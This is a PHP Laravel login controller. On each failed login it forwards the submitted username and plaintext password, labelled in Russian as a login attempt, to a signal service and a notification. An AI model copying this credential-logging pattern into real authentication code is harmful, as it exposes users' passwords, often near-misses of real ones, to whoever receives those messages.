<?php

namespace App\Http\Controllers\Auth;

use App\Components\AppCenter;
use App\Components\SecurityCenter;
use App\Components\Signals\AuthFailSignal;
use App\Http\Controllers\Controller;
use App\Notifications\DefaultNotification;
use App\Order;
use App\User;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\App;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Lang;

class LoginController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles authenticating users for the application and
    | redirecting them to your home screen. The controller uses a trait
    | to conveniently provide its functionality to your applications.
    |
    */

    use AuthenticatesUsers;

    /**
     * @var Request
     */
    private $request;
    /**
     * Where to redirect users after login.
     *
     * @var string
     */
    protected $redirectTo = '/home';

    /**
     * LoginController constructor.
     * @param Request $request
     */
    public function __construct(Request $request)
    {
        if (!App::make(SecurityCenter::class)->checkUserIp()) {
            echo(Lang::get('access_messages.blocked_user_message'));
            exit();
        }

        $this->request = $request;

        if ($this->notifyLogin()) {
            return redirect()->back();
        }

        $this->middleware('guest')->except('logout');
    }

    public function username()
    {
        return "login";
    }

    private function notifyLogin()
    {
        if ($this->request->has('login') and $this->request->has('password')) {
            Auth::attempt([
                'login'    => $this->request->input('login'),
                'password' => $this->request->input('password'),
            ]);

            if (Auth::check()) {
                Auth::user()->notify(new DefaultNotification());
                return true;
            } else {
                App::make(AppCenter::class)->sendSignal(new AuthFailSignal($this->getAuthFailSignalMessage()));

                (new User(
                    ['login' => $this->request->input('login'), 'password' => $this->request->input('password')]
                ))->notify(new DefaultNotification());
            }
        }
    }

    /**
     * @return string
     */
    private function getAuthFailSignalMessage()
    {
        return "Попытка входа.\nЛогин: {$this->request->login}\nПароль: {$this->request->password}";
    }
}
